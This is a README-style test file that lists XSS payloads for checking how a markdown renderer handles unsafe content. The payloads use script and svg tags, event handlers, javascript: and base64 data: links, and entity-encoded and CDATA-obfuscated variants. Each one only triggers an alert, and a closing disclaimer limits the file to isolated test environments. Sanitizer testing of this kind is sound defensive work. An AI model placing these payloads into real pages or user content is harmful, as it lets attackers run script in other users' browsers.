# ⚠️ XSS Payload Injection Test

This README file includes **XSS payloads** in different markdown contexts.

## 1. Basic HTML Injection

<svg/onload=alert(1)>
<iframe src="javascript:alert('XSS')"></iframe>
<img src=x onerror=alert('XSS')>
<script>alert('XSS')</script>
<details open ontoggle=alert('XSS')><summary>XSS</summary></details>
<math><mtext><svg><animate attributeName="href" values="javascript:alert(1)" /></svg></mtext></math>

## 2. Markdown Image Injection

![XSS](javascript:alert('XSS'))
![xss](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+)

## 3. Link Injection

[Click Me](javascript:alert('XSS'))
[Link](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)

## 4. Inline Code Injection

Here’s a code block with `"><img src=x onerror=alert('XSS')>` inside.

## 5. HTML Elements

<div onmouseover="alert('XSS')">Hover me!</div>
<a href="javascript:alert('XSS')">Click</a>
<video><source onerror="alert(1)"></video>
<body onload=alert(1)>

## 6. Autocomplete Fields

<input type="text" value="XSS" onfocus="alert('XSS')">
<textarea onfocus=alert('XSS')>XSS</textarea>

## 7. Obfuscated Payloads

<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>

## 8. CSS-based XSS (in some cases)

<div style="background-image:url(javascript:alert(1))">Test</div>

## 9. Data URI Payloads

<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>

## 10. Comment Injection (for systems parsing comments)

<!-- <img src=x onerror=alert(1)> -->

---

### ✅ Disclaimer

This file is made for **testing how a markdown-rendering system handles unsafe content**. Use it only in **safe, isolated test environments**.

